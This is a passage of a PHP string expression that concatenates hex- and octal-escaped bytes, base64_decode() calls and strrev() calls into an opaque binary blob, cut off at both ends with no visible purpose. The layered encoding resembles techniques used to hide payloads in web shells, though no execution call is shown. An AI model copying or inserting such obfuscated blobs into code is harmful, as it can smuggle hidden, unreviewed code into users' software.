x8f".base64_decode('zj3z9SVW0H3Pn3a/c6v7Z1rvNQ/H4tuOX9Fk/vSy0w+fcs6rB2/YcOfam7bc2GE9vWPq5g==')."\xba\xf7\xb7\xdd\xda\x70\xd2\xae\xbb\x6f\xb9\xd4\xac\xf8\xeb\xf\xcf\xfd\xec\xb1\xe9\xfd\x5b\xd7\xec\x3a\xf2\xb6\x65\xf7\xec\xf9\x85\x35\xf2\xec\xba\xc7\x5e\x6c\xa9\x73\xcd\x5b\x72\xe7\xc6\xe7\x6b\x8e\x1a\x3d"."\267\366\243\255\27\336\162\225\362\305\205\231\257\125\74\167\350\5\311\272\306\215\241\346\145\223\137\130\230\374\326\236\363\116\273\51\320\330\161\310\356\247\316\274\372\274\215\337\335\267\351\217".base64_decode('F7q2nmQMzrjhxDdGLntmx0k1f5//0KOnPXXqlGOK4S2nn7n78cE//f3K9rWvjZ7/xT+v2Q==').base64_decode('8O3TP+j7zqtvdt+xZcb4rGTBaux7Z95tPzjihm/eq968KHPE4BM/mTt//gun5+6ePz1z9w==')."\xd0\xd3\x4b\x2\xc9\x9a\x97\xdf\xfd\xcd\x1f\x9f\xcf\x1d\xd7\xf2\xd3\xfd\x35\x2d\x9b\xdf\xdf\x9e\xbc\xea\x71\x6b\xf6\x5b\xd9\x17\x3f\xbf\x6f\xb9\xf1\x5f\x47\xef\x9\xbd\xb7\xf7\xd5\xd7\xae\xde\xf4\xd7\x5f\x6"."\xd6\xf4\x7c\xf9\xd4\xf8\xfc\xfe\xad\xd3\xc7\x4e\xf4\x7f\x7f\xcd\x92\xf5\x27\xac\xfc\xe9\xb1\x8f\x4f\x5d\xff\xda\xd1\xcb\x9b\xfe\x7e\xf9\x13\x3f\xba\xb5\xe7\x57\xb7\x1a\x7b\xce\x3c\xf2\xd1\xcd\xb9\xdb\x7f\xbe"."\373\347\337\330\75\272\356\363\103\256\72\370\117\312\75\55\372\330\340\246\174\374\343\236\23\274\277\57\276\377\241\257\365\273\47\237\175\246\332\335\162\353\107\113\373\217\130\167\130\353\335\25"."\312\174\375\117\123\23\307\36\375\235\65\77\354\377\170\245\277\361\203\352\243\17\232\163\350\105\307\174\176\320\15\323\222\365\137\346\257\274\372\227\7\77\376\306\247\67\27\277\177\351\143\3".strrev('¡àºŞÏ÷äÿ/où²¾ïúwz“6¡ºëéŸÌw‡\'¾ü|îÅâë·Ó\\l¯oÎv˜?Sı+')."\xec\xca\x25\x75\x3f\x7f\xf2\x15\xcf\x9d\xaf\xad\xff\xa0\xed\xcb\xe5\xc7\xb5\x2d\xfd\xa4\xfa\x84\x1d\xe9\x8f\xef\xd9\xf3\xbb\xf3\xae\x7b\x2b\x70\xe1\x33\x3f\xbf\xef\xed\xbf\x9c\xf2\xd9\x8c\x9f\x3d\x95\x78\xe7"."\220\344\277\365\236\367\253\347\366\234\165\363\236\63\17\375\317\330\217\17\372\321\265\367\32\237\257\374\173\361\355\251\161\145\365\363\107\74\137\323\174\347\244\117\136\256\174\351\364\333\23\343".base64_decode('T1w5EFt20OH5h5WNRd83z9lz+Tk/7986+ITryNmrHz3m0ivufW38bw8Pvnfr0ie+fca1Zw==')."\154\76\377\236\263\276\135\170\375\233\125\57\135\377\353\327\136\133\222\74\375\6\375\326\27\137\331\164\316\215\233\307\177\270\65\377\213\334\343\367\277\237\353\272\153\306\101\177\77\364\263\365"."\x6f\x3e\x75\xd2\x6d\x27\xbc\xde\xdd\xb3\xe6\x9f\x2b\xbe\x7f\xf7\x37\x9e\xf9\x7c\x61\x64\xe1\xed\xb7\xdd\xfb\x9e\xaf\xf5\x92\x43\xcf\x39\xea\xae\x8a\xaf\x5f\xb3\x39\x7b\xb3\x72\xec\xfc\xb5\x2f\xfd\xe1\xfa\xdb"."\x1f\xf2\xbc\xd8\x70\xaf\xfb\x85\x13\xa7\xad\xba\xef\xa3\x2d\xfb\x4f\xdd\xf5\xab\x7f\xed\xff\x61\xec\xce\xef\x9c\xf9\xab\x1f\xff\x7e\x43\xfe\xa4\x7\x86\x5a\xce\x9b\x52\x6c\x7c\xfd\xee\x9b\x9b\x2e\xbc\x5f\x1f".base64_decode('WKHXnLP7phvbpzSu7PRc868v3nx5+Y8e+uKfbz+h/vKUv3382Sknm19+WHnpsYt2ffq7RQ==')."\17\255\373\360\255\317\356\362\376\256\342\344\217\377\366\331\330\103\17\116\72\345\241\317\236\33\333\172\351\245\327\234\74\374\345\73\177\272\372\224\217\236\35\173\361\224\135\377\170\363\256\177"."\175\371\271\171\322\13\201\131\247\134\163\367\214\206\103\367\314\173\347\223\265\77\135\266\347\147\103\306\375\117\176\362\372\311\352\113\153\267\236\270\165\316\75\103\127\354\132\163\333\27\147\14"."\xde\xf8\xca\x73\xff\xd8\xd0\xf2\xd8\x27\xc7\x2e\x38\xe4\xeb\xbf\x3b\xf3\x85\x7c\xe2\x9a\xf3\x2e\xfc\x4b\xaf\xd1\xb8\xf6\xa7\x57\xb5\x27\xff\xfb\xae\x57\x47\x1f\xec\x78\x75\x67\xf4\x8f\xae\xe4\x7b\x5f\x76\xa4"."\xa6\xad\x9d\x12\xa9\x39\xf6\xd1\xa3\x47\xf\x7e\xba\xb0\xf8\xc7\x9b\x8b\x1b\xbf\xb1\xf1\xbd\x9b\x3e\xfd\xee\x45\x47\x64\x7e\xf2\xb3\xcf\xbf\x79\xf9\x13\x47\x1c\xfa\xda\xce\xde\x2b\x6b\xae\xfa\xd7\xb7\x7f\x9a"."\xb9\xf3\x89\x8f\xbe\xcf\xde\xee\xcd\xaa\x83\x5b\x58\x78\x65\x34\x67\x2e\xa8\xfd\xf4\xae\x4e\x9a\x3\x45\xe0\xc9\xeb\x66\x1\xd4\x6c\xc8\x5\xb1\xdb\x4c\x6\x6d\x99\x83\xbd\xc6\xd0\x28\x8d\x40\x5a\xdd\x3c\x60"."\265\206\172\363\375\31\3\70\321\271\40\126\56\14\17\366\16\44\127\3\104\66\127\64\23\160\317\74\257\156\36\64\151\16\150\376\144\372\127\27\322\51\70\43\315\234\5\331\103\43\203\371"."\276\121\340\173\13\361\164\302\134\15\214\143\335\114\326\231\71\64\220\310\364\255\36\145\174\43\64\140\136\315\74\306\22\102\337\147\314\236\301\122\240\334\360\110\52\327\313\152\235\123\307\72".base64_decode('Pxe6P5jQho0hdtZfPVAYTcFtet1c0HybXQOBOVB3KlPs103gUmtZD1ePZos5A2SOq+NWNg==')."\x3d\x9c\x61\x35\xc1\x28\x16\xe3\x23\xb9\x7c\x1a\x86\x78\xde\x2c\x68\x4b\xbf\xb5\x5a\x2b\xe6\x40\x64\x35\xb3\x6\x1a\x36\x6f\x2e\xd4\x3b\xb3\x16\x3e\x9f\xcd\xf7\xa7\xe2\xa3\xa0\xd8\x3d\x67\x1e\x94\x36\xfa\xf5".base64_decode('UTNRZFKDpD7I1KrSq/utnAHTXxjp7+1LQOtSxcFMTmeX24mCNaID2KwaGNo5M6HNM2dCOw==').strrev('0ÃfÎ23Ò†ÎÖ5'."\r".'š9²xØ¶­«3Ió#BÕÔØÂI•3ys€ğ6Ş}¦@ğÆ}\\JcÏf')."\x73\x26\x9b\xd9\x3a\xf8\x52\xaf\xb6\x7a\xd0\x4c\xf4\xb3\x46\x41\xea\x60\xa1\x57\x1f\xce\xc1\x55\xfa\xec\x3a\x28\x9d\xee\x1f\xb0\x4c\x76\xa9\x3d\xb7\xa6\x86\x7d\x17\x2\x83\x46\xbc\x5f\xb3\xe0\x2\xd7\xe8\x1b"."\xc8\x99\x49\xa8\x61\x4\x1d\x5e\x7\xe2\x30\x53\xc9\x42\xc2\x48\xb1\x87\x49\xf3\x58\x3b\xe6\xce\x81\xc0\x6c\xa6\x22\x99\x44\x67\xac\x62\x7c\x90\xe1\x5\x74\x60\x1e\x74\x0\x9d\x81\x87\xb5\x11\x76\x73\xa6\xaf"."\36\112\153\154\326\222\106\177\357\20\23\367\24\7\106\122\375\5\206\161\320\221\102\32\341\277\5\63\126\34\36\112\365\215\202\324\170\56\133\113\14\235\206\106\6\212\346\40\340\300\14\370"."\270\66\144\366\216\60\15\377\332\31\60\311\265\363\30\16\215\26\6\163\200\131\231\241\370\360\150\26\6\305\34\51\366\367\145\12\154\321\300\174\365\31\375\111\324\33\150\43\64\161\140\44".base64_decode('3qf3wpDlc0MD6aLGcATGu9cs5kfYC4FUtj8xVITxmDsPxrB25lyGSENxi41DLRvEeTOgqg==')."\xd1\x62\x6f\x22\x1d\xe7\xb\xc\x1a\x36\x30\x9a\xd0\xcd\xc2\x10\x1b\x79\x68\x59\xae\x37\x9b\x8c\xf7\x43\xf7\xea\xea\x98\xbe\xf6\xb0\xde\x3b\xc2\xd0\x38\xad\x19\x3\x5c\x91\xa0\x51\x8b\xf7\x33\xf1\x2f\xd7\x81"."\x96\x55\x8b\xa9\xe2\x16\x15\x96\xc9\xf7\x25\xec\xbd\x66\x3a\xe7\xc9\x6a\x39\xae\x34\xd3\xa\x48\x25\xa7\xf5\xeb\x3a\xd3\xf4\x87\xa1\xb6\x84\xfa\x5\x68\x35\x43\x7a\x3a\xab\xb\x91\x36\xbd\x38\x60\x25\xc5\x41"."\33\113\71\44\5\16\34\215\312\265\304\163\226\224\215\142\266\334\250\374\30\1\172\207\133\350\221\173\275\62\313\224\276\313\134\100\202\54\326\64\207\214\2\214\130\277\221\210\147\214\142\302"."\126\153\242\327\123\146\44\151\117\312\345\364\71\323\271\302\217\250\320\246\131\317\322\154\243\326\113\146\224\153\27\341\377\240\335\364\345\261\211\165\333\371\143\71\166\175\145\327\327\245\165\170"."\330\164\365\112\110\102\345\365\226\146\366\173\344\144\267\234\233\316\241\136\144\62\36\373\13\165\374\124\274\263\103\215\371\242\113\45\135\76\374\224\331\326\224\222\336\211\251\224\306\125\236\121".base64_decode('+0gwjNm/fdfY5kvGL759fNO2sft+sX/b7WMPXIyie3eeP7btl29dvn7vzk17d566f8OO9w==').strrev('í6/øóa¶;_gc%×w³ßÖÆsªüm¼î÷Mßa´?ö®ïa¾ÿcMÕv0<gıöólo?ï').base64_decode('feAqBD9+tqgZgY3ddhkue//pYzt37r/uJp77/v0gxxmFPadFt5ToCSGmoEXQVFmoAILqpg==')."\x47\xe9\xc8\xe8\x68\xc4\x14\xa2\xf4\x8c\xb5\xb9\xac\x94\x5e\x50\x2c\xa2\xd5\xa5\xa1\xbf\x9c\x91\x73\x53\x4\xa4\xaf\xeb\x4d\x25\x9d\xc3\xd9\xa\x1b\x6b\xf\x47\xd2\x98\x9e\xcd\x63\x54\x83\x51\xf2\xd2\xa7\xb6"."\266\127\33\22\76\226\33\146\232\121\6\273\360\130\213\271\252\302\101\270\235\303\202\74\245\117\103\11\211\172\245\17\25\143\67\30\75\212\145\260\160\166\204\117\272\143\121\224\235\126\336\14"."\x36\xb5\x49\x2e\x4f\x17\x62\x5e\x68\x98\xf4\x1c\x87\xde\xa5\x94\xa0\x14\x59\x65\x76\x12\x61\x5b\x7f\x76\xe2\x22\x67\xd9\x47\x2\xe4\xb0\x44\x93\xc0\xa5\xd0\xa6\xb8\x14\x72\x7f\xac\xd8\xdf\x94\x63\xcd\x0\x76"."\333\56\257\31\271\371\5\75\237\341\327\106\130\224\131\166\20\35\135\210\226\31\56\336\11\133\46\132\217\105\253\14\240\74\252\262\174\67\155\370\63\210\300\211\213\115\162\207\57\232\113\243".base64_decode('Qq6MPsTpY0FPpJl+sZ4lkEAXPdKtDn1hxZWc4wjtC7YLqwWL8qk8NtBhzV8EjxnYKzypDQ==').base64_decode('EBaPyeTUjPMSjC+SpkbJTAYGq3e73ZKwVmiY4ZDKOkZeBUVTRQsrUrRkjF6GJuKGGYEH8A==').base64_decode('4p4ovYkrXqBVn0yi+urJc11luoL6MNdTiwJkfczyzEFBMpiwprthgIsmeyE1xTMTtnpzPg==')."\334\64\316\47\244\245\101\352\31\244\213\122\305\134\206\245\242\40\2\211\24\163\30\21\352\355\303\241\347\22\122\241\371\132\334\222\152\125\373\140\274\75\142\250\264\351\42\137\117\300\43\104"."\xaf\x34\x80\x43\x0\xc0\xca\x8a\xf7\x23\x34\xde\x66\x47\x17\x34\x1e\x6e\x8e\x41\x8\x13\xd0\x6\x95\x30\x89\x52\x2b\x6c\x30\xf0\x9\x53\xb2\x74\x10\x11\xc8\x87\x8b\x93\xe1\x3b\x40\x51\x4b\xc6\x8e\x3c\xda\x4"."\163\134\233\325\314\150\354\336\321\304\217\105\162\72\107\325\242\311\257\106\260\346\267\212\266\176\123\240\265\232\110\103\146\50\330\250\66\5\43\174\11\132\354\11\274\257\43\250\106\243\141\351"."\105\14\274\323\131\32\156\122\375\341\360\322\40\240\146\275\104\52\361\13\115\161\367\214\143\342\245\46\276\206\221\365\316\144\336\4\33\376\300\373\155\124\1\375\114\204\374\376\126\137\204\353"."\307\317\362\324\170\152\5\54\372\240\212\37\6\64\60\153\2\321\230\57\122\306\374\13\65\13\3\303\16\246\140\240\100\153\170\271\342\17\207\72\333\332\243\324\352\11\115\157\17\113\371\104"."\xb\x1a\xb2\x99\x71\x98\xd2\x6c\xa8\x3e\xd0\x11\xf2\xf9\x3\x4a\xb0\x3d\x16\x66\xf\x1b\xb8\xfa\x29\x79\xd2\x12\xe5\x71\x36\x4\x5\x53\xe7\xc6\x5f\xa0\x3c\x8d\xc8\xcf\x6e\xe4\x1a\x79\x4d\x80\xb8\x5d\xae\xca".base64_decode('7oruad1V3dWrPN1mj1favNLy9ECkowm6V89DCROWbFsU7fo0GI74/CHWlEZfFIJhf5AG9g==')."\x6d\xb9\x63\xef\x7d\xe7\xef\xbb\x72\xdb\xd8\x39\x9b\x50\x45\xe3\x57\x9c\x3e\x7e\xe9\x3d\x88\x57\xc1\xfc\xc9\xb6\xf3\xf6\x3d\x78\xfe\xf8\x96\xed\xe3\xe7\x1\x5f\xa1\xec\xdf\xfe\x9b\xbd\xf\x3c\xb4\x6f\xcb\x4d"."\143\333\56\33\277\344\336\175\127\234\111\63\336\272\371\216\261\163\157\342\15\123\336\372\305\203\343\347\137\317\171\26\312\252\270\120\351\267\326\157\332\367\300\66\314\261\374\372\324\361\273\67".base64_decode('jl+1aezc68Yuv2nf+dvHfnXG2Fmb9m+/eLITkWi8i00FPBL3noQf+NPh7Tan46GtRr9V+A==')."\325\4\372\145\312\337\104\15\370\204\316\100\273\77\340\174\167\44\107\301\162\316\64\212\41\124\63\6\130\127\23\54\357\260\70\261\264\321\120\71\141\53\326\302\374\113\215\222\32\323\24\210"."\372\43\301\306\0\350\345\363\211\232\102\30\54\120\156\100\251\321\310\62\36\346\257\150\113\54\35\51\125\14\231\253\25\133\107\64\117\334\310\24\263\71\322\130\245\2\253\151\125\270\360\206"."\104\36\101\51\25\170\163\105\11\72\66\13\120\205\355\240\20\155\336\312\225\225\256\32\127\155\265\2\146\220\150\11\60\176\244\124\200\122\70\57\147\373\210\253\327\26\253\165\325\124\53\25"."\xf9\xfe\xa\x68\x97\x18\x57\xd4\x7a\x95\x42\x9a\x8a\xe6\xaa\x82\x6\xcb\xcd\x15\xb0\x88\x46\x9a\x56\x41\x4b\xa3\xb3\x82\x12\x77\xf1\x24\x5e\x1e\xfd\xda\xc\x1a\xc5\x3d\xa2\x4\x9d\x27\x4\xe1\x4c\x53\x7c\xed"."\115\166\110\152\7\251\243\222\350\124\306\75\26\67\250\302\246\271\262\132\351\205\327\16\145\62\111\61\333\140\64\330\6\243\152\72\320\211\216\26\76\337\364\51\203\102\337\266\321\146\151\46"."\x9b\x28\x48\x25\x53\x85\x53\xe9\x6c\x31\x58\x3\x75\x3\x4d\xe\x85\x47\x1\x9e\x83\x55\xfd\x79\x4d\x88\x1c\xf1\xc\x36\x83\x38\x9d\x4f\x62\x99\x3c\x62\xa0\xaa\x82\x32\x81\xb4\x9f\x59\x33\xc9\x48\x1d\x3c\xfe"."\x6f\x5b\xc9\xfb\xc0\x70\x99\xab\x1d\x71\xf3\x56\xf8\x95\x5e\x20\xe6\x6f\xa5\x58\x1e\x95\xd0\x3c\xd1\x3b\xc5\x86\xa8\x62\x38\x15\x1b\x8a\xf0\x93\x4\xc0\xd1\xe5\x82\x9\xc2\x24\x2\x17\x6c\xc7\x2f\x4c\xe9\xeb"."\xb4\xa8\xbf\x35\xd0\xe6\xf3\x0\x11\xa7\x98\x40\xe1\x31\xdb\xa5\x34\x28\x95\x98\xf2\xd1\xa4\x4a\xdb\xf0\x93\xf\xb1\x21\x8b\x91\xaf\xa2\x75\xa5\x5a\x88\x51\xa2\xa3\x90\x4f\x42\x63\x60\xf6\x15\x62\xc5\x40\x23".strrev('s{pşqÊ¡µÌËÑ\'2f|â]¼d¹?óIv”­ÕÏ '."\0".'*bGaÛ’¨¡©*E')."\220\75\304\153\202\3\163\76\141\330\200\232\42\101\154\107\4\276\257\260\252\244\347\217\50\42\124\51\120\44\77\224\340\141\141\232\1\147\360\75\37\105\304\226\217\42\174\263\301\120\222\135".strrev('òŠ	¶w¶¡Ü}x:ç,Qm|EñˆáÆ¦¿•¸x›Ë¾¦ì£:E¾;hıü9')."\55\103\310\22\26\14\12\243\326\125\236\151\213\252\273\351\313\71\32\244\77\213\131\14\277\46\352\131\123\353\122\146\257\253\6\30\156\217\303\112\245\163\214\273\304\137\71\41\244\206\302\55"."\64\116\354\335\5\162\11\161\114\121\272\24\304\352\306\4\253\153\262\255\213\257\6\5\341\260\102\37\340\52\355\341\345\76\141\102\115\312\200\24\141\121\315\173\122\127\367\120\267\7\61\13".base64_decode('5irxEq6pUWFsCDHFAqd+KO1j2+gqF+wYasZIcg6xvYmxC/R3BQsQWgkF4uTt9zBvhM99og==')."\xda\xbd\xb6\x7b\x6a\xb7\xdb\x43\x9f\x1f\x62\xe6\xa5\xdb\x25\x9a\xa4\x6\x56\xa0\x3d\x36\x1a\xb5\xbd\x9d\x54\xb3\xf8\xe9\x38\xd4\x8e\x7a\x9\x21\xba\x6a\x69\x64\x1\xfc\xc0\x41\x6c\x1\x9c\x4\x20\xba\xb0\x81".base64_decode('T2bghLXt6K8ltjaA/kLoJxRD05XmAGhJhoJLA2vxPyKjmg8kfVtkLxBsX4v+RQRmbbDdWQ==')."\131\143\40\266\74\20\240\0\54\14\277\2\24\21\34\350\252\144\17\21\353\373\103\266\320\377\207\252\125\265\212\14\246\273\147\172\265\252\172\315\116\300\27\156\125\244\252\362\370\332\112\330"."\103\174\121\277\240\276\66\204\50\305\5\242\235\157\107\4\156\345\17\342\55\221\160\147\207\24\157\365\55\13\266\267\260\230\167\32\13\115\203\252\225\246\140\24\15\221\237\41\243\60\76\50".base64_decode('x4HhJGyRzPXaULoJUXYUkVh2fBiglNm+yho7g6Em+YE4BoQNhVB12FOmsMaxOHkqziJ4yA==')."\x59\x98\xa0\x1b\x8b\x90\x31\x60\x11\x3a\x0\x2c\x46\x86\x8b\x45\x88\x91\x43\x16\x21\x1d\x65\x11\x7c\x3a\x9\xb4\xb3\x3c\x74\xa\x44\x27\x38\x76\xb4\x4b\x69\x83\xfc\xbd\xe3\xfc\x44\xaf\x64\x72\x4\xd3\x60\xf".base64_decode('FZRhmzTo2KhxUalDtknEUtJRn6rdKdJDaywklURJXgqBmE8Cg367Vy0izPEqhqf0qa8VSw==')."\133\31\333\107\341\41\40\372\150\220\274\303\224\76\313\36\114\20\231\240\152\110\162\152\262\157\313\11\102\12\105\205\332\40\300\25\102\36\254\175\110\104\273\64\152\77\121\161\62\265\212\37"."\x94\xc0\x6\x85\xb\x7e\xa1\x45\x47\xd2\x9f\x6e\x88\x32\xa9\x45\x37\x7c\xa4\xd2\x5\x9b\x6e\x37\x63\xd8\xbb\xba\x87\x6b\x6a\xdc\xe8\x9f\xb9\xe8\xaf\x11\xfd\xf9\xd1\x5f\x0\x27\x34\x77\xf\xcf\x69\x46\x81\x79"."\315\75\136\270\100\352\356\256\230\150\70\1\200\15\52\104\53\150\224\225\112\363\75\62\236\302\66\157\124\53\313\204\345\344\60\47\344\321\124\136\56\342\115\221\160\7\345\130\224\140\263\102"."\155\54\50\225\124\302\136\11\254\230\77\22\300\253\211\102\261\274\252\112\233\54\153\141\245\2\317\257\253\355\245\202\355\115\201\25\112\145\72\61\254\152\232\12\205\25\264\166\131\105\112\111"."\115\254\6\332\126\270\70\62\123\306\220\42\243\43\73\137\373\151\132\114\240\150\11\53\107\254\45\260\7\256\56\70\304\363\34\312\101\323\254\140\24\155\360\241\20\351\51\312\112\233\230\361"."\165\51\334\250\1\116\304\207\25\52\27\205\212\130\6\255\210\146\5\126\304\42\76\234\110\270\325\303\46\241\377\10\1\302\247\251\102\126\243\257\76\11\217\347\131\5\102\205\125\66\226\222".base64_decode('MpuYqQQMI1uk1CeeQyQLdJhlucNS4NJprCMSbPNFVsKQiTMDLFEjY3v7KyJps1N6h96OWg==').base64_decode('Lb9Lp3PMKTI6/zKKjFpDgxV45mkQbNiq/HExE7pUsUe6LhZgBh7I+ycmu8oiEsVjYtYA9w==').base64_decode('YVbkXPkFlzCyizdVPMlsd2j2dYbkFBgqZWlg5QHWCGtpuTXC8pj4RtwG8bGAnlXNgp5SWw==')."\24\125\165\350\64\133\314\141\343\53\114\136\50\236\102\17\342\227\313\132\241\252\156\26\53\304\332\16\73\166\147\54\254\242\135\51\22\300\173\104\111\137\244\63\274\74\141\120\30\3\160\153"."\306\7\350\66\203\51\327\155\136\236\113\261\2\355\55\301\366\100\3\176\146\215\170\5\326\134\220\323\141\353\236\163\241\236\140\130\15\41\376\132\225\105\161\301\60\210\210\155\246\43\125\125"."\xd8\x34\xf1\x68\x42\x9d\xdb\x2a\x14\x25\x43\x7c\x69\x83\xa8\x4e\xb7\xf1\x57\x16\x44\xd7\x1b\x21\x8b\x4f\x58\x36\xe0\x62\x6c\x92\x57\xec\xc5\xa5\xe5\xad\xf\xca\x3b\x2c\xb4\xa6\x8d\x7a\x9c\x83\x81\x29\xc7\x33"."\137\200\253\266\217\73\165\245\345\144\241\306\55\56\206\331\335\63\67\344\7\5\72\45\313\4\270\260\302\76\110\256\202\162\366\346\241\315\66\303\54\175\251\272\350\115\126\67\115\176\101\34".base64_decode('S+mKmdfjxCSoAobslIShm8J+OIw9OXOxoJUSNhxkW7pNjWyQizkrqmdAfN/US/TlxaM48Q==')."\344\110\322\243\47\27\64\142\346\250\205\100\107\101\250\51\310\207\106\202\22\211\41\141\74\27\337\207\210\72\173\230\344\100\214\307\150\232\155\220\316\33\104\336\310\234\321\241\27\262\151\162".base64_decode('CbRc3PHAHoQqoPPvcb6GkkcdXxyWQGJbFQeaQ2b1ibRMehGJo4woZG0vroo59BG3/PwI4Q==')."\xe\x49\x94\x1e\x3c\x30\x73\x8a\x34\x36\x7\x14\x3d\x10\x7e\x42\x20\xc9\xb4\x65\xe0\xb7\xc0\x72\x3c\xc2\xb6\xd\xa9\x13\xf3\x56\x6e\x61\x61\x22\xa1\xc9\x8f\x44\x25\xb\xf4\x93\x65\x4c\x21\x53\x2e\x70\xbb\x2f".base64_decode('LZub8Aj7w3y5LOYThR9Pw1U8Ztv7VKktHRxeWB6loyFNA0mgQbLAlXrRiNY0xv8RCXek1A==')."\x36\x66\x80\x9\xac\x1f\x87\x8c\x24\xa7\x4d\x88\x7d\x5\x63\x5c\x36\xfa\x14\xc\x43\x59\x8f\x8e\x9f\x3f\xd1\xc7\x28\x1\x6e\x3c\x12\x15\xa4\x26\xde\xbe\xba\x50\xa7\x64\x0\x7a\x2\x92\x52\xb6\x9c\x1f\x0\xf9"."\x7\xb\x44\xf4\xf4\xd5\x1f\x8c\xe8\x82\x23\x40\xc5\xc8\x6b\xb3\xaf\x2c\x24\x48\x2c\xf9\x12\x29\x24\x91\x65\x47\x19\x82\x8e\xf4\x65\xc\xcc\x7c\xa\xb2\x5\x8e\xa1\xbd\xa0\x3d\xac\xb6\xa2\xed\x26\xcc\x18\x96"."\264\31\263\221\167\126\12\110\10\271\204\362\222\147\277\160\174\234\117\124\15\350\345\47\114\366\32\104\271\171\210\251\217\200\75\57\301\50\370\350\317\312\154\302\215\32\16\130\227\320\55\156"."\125\211\274\243\224\154\76\111\217\246\263\234\300\16\111\26\137\265\101\35\77\56\143\302\231\22\315\33\350\112\151\347\240\211\370\366\54\32\356\214\260\233\36\34\307\22\56\65\22\360\257\344".base64_decode('ly48tdm3zJkSxBJKX0vZZC43w+nkgKpGwljAGAg1OwpEW7m1YHuaGgq2Ly2bgRiSNqkITQ==')."\xc\xc6\x2\x6d\xce\x34\x7b\xd\xd1\x80\x2f\xc2\x4c\x59\xe3\x78\x63\x28\xec\x97\xb2\x83\xe1\xd2\x91\xe0\x1c\xf\x4f\xa4\xe2\x49\x9a\xe8\x3d\xa9\xaa\x7b\xd\x39\x31\xd5\xa3\x83\x53\x62\x2d\x96\x63\xb8\xd5\x9e"."\xe9\xd5\x8b\xba\xd7\x55\x57\x75\x7b\x17\x79\xa6\x71\xf1\x1b\x25\x57\xd2\xe3\xdc\x9\x92\x4d\xb6\xf9\xd4\x3b\x13\xf0\xbe\xc5\x12\x69\x31\x88\x79\x3d\x1e\xf8\x8\xf\x78\xbb\xbd\xcc\x74\x97\x57\x64\xc2\xaf\x80"."\77\316\261\307\200\351\370\50\265\203\144\153\250\303\110\10\173\225\357\161\276\0\123\331\263\57\106\131\265\76\246\142\20\244\227\270\152\164\145\224\317\225\75\315\206\221\24\247\145\115\13\7"."\60\372\353\220\101\261\22\117\131\100\33\112\333\36\105\313\111\236\264\41\126\213\130\326\11\43\136\304\226\227\304\34\211\47\324\50\311\143\253\2\21\364\176\41\43\200\125\31\145\253\67\207".base64_decode('9krYjP2Ia21pDS5ZGmprD3ecEInGOpctX7ESDH/WM6TpU9xMIgKWdL2IX/cOMrcBy/CBRA==')."\67\275\62\63\307\23\121\37\261\11\144\146\14\215\12\62\170\56\246\36\336\362\131\264\66\157\66\147\325\116\0\321\121\320\173\15\303\232\40\167\131\333\201\53\206\314\256\156\263\207\143\151".base64_decode('Qh9kndZB+VOow5niPAbchlv2Y4DRVmYcE70OtgAShCFMiXkQidwaNo2O6EK10BiSrEmz1Q==')."\x83\x8a\x3\x4b\x5\xd6\x6d\x5b\xb0\x31\x57\x66\xbc\x75\x80\x18\xbb\x74\x5a\xca\x1c\x70\x6b\xfd\xb6\x7c\x61\x61\x7a\xc0\x8d\x4e\xb0\xb6\xb8\xc3\x5a\xe6\x54\xb2\x15\xb4\x19\xc9\x42\x9d\xd7\xc2\xed\xcc\xa1\xed"."\x3\xda\x2\xc\x85\xbc\x5a\xc8\x96\xc2\x75\x86\xf0\xc6\xd5\xea\x58\xab\x3c\x91\x1b\xdb\x88\x12\x8d\xca\x7a\x65\x26\xf8\x5\x68\x46\xac\x77\x42\xe9\xa2\xdc\x34\xc8\xff\x31\x27\x46\x4c\xdb\xd3\xa8\x4b\x11\x16".base64_decode('uJnk1m5amy0XLGSTnrrGZVMLjPhm+4USWrafa4fEbcwH3uebJV01wV+A8w6U1zjCtG/hAQ==')."\151\343\110\104\162\113\144\63\163\41\273\73\321\362\171\177\12\367\301\266\206\155\111\161\71\322\207\165\132\144\135\30\273\175\157\224\335\104\231\274\4\207\67\105\210\33\354\356\223\114\171\227"."\xd4\x80\x18\xc2\x5c\x80\xbd\x95\x2f\xc9\x45\xdc\x63\x5a\x64\x1f\xb8\x2d\x6d\x64\x78\x39\x30\x1c\x20\x60\x4d\xb0\xad\xc3\x64\x8b\x72\xea\xb0\xdb\x30\x4d\x77\xbe\x60\x60\xed\xb8\x86\x74\x36\xe9\x35\x87\x20\x2f"."\243\231\326\62\233\371\241\257\264\341\215\255\154\264\161\166\32\232\60\354\46\130\315\76\2\105\161\222\267\100\314\347\272\206\140\373\160\21\23\231\152\15\103\30\57\152\233\27\133\120\44\174".strrev('Bz¶Ù»¨yNc‘ˆèØ’û¾ÄaU…†ŸŒ©‘ÖË›‡µL-mÓt•eÔ÷½‘eÙGjW/').base64_decode('J83lb+Uls+TYZQda6kzvTzJQjhjCJJ9GYpBXNqyIh9ydtXnqoBNkN/tt6no/01PEsy0oSg==')."\201\133\147\247\127\277\356\262\11\156\111\363\220\256\47\311\203\3\376\34\310\1\122\324\67\4\264\227\376\234\130\256\365\356\202\60\230\216\146\207\172\232\130\252\217\60\303\326\7\266\215\335"."\335\322\335\326\35\223\273\153\25\264\276\76\324\130\311\144\52\237\104\141\41\35\60\211\170\134\141\335\237\330\276\72\334\151\114\55\153\236\35\62\43\264\337\176\174\362\32\306\356\60\204\275".base64_decode('zs5IyHZRBaCsh6Mpt59pghnFTIKcZtGnjAw6yIsr6/FLrx2/6+L9D/1y/Pzr9+7cNX7VfQ==')."\x34\x9d\x8e\x58\x93\x9e\xe3\xf3\x3e\xbe\xf1\xa2\x7d\xbb\xae\xde\xbf\xed\xa1\xb7\x2e\xdd\xf6\xfe\xfd\xe7\xed\xdf\xfe\x1b\xac\x92\x74\xcd\xf5\x54\x43\x69\x6c\xf3\xe9\xe3\x17\xdf\x3e\xb6\xf9\xdc\xfd\x77\x9f\x39".strrev('qfƒ¥¤eÌ+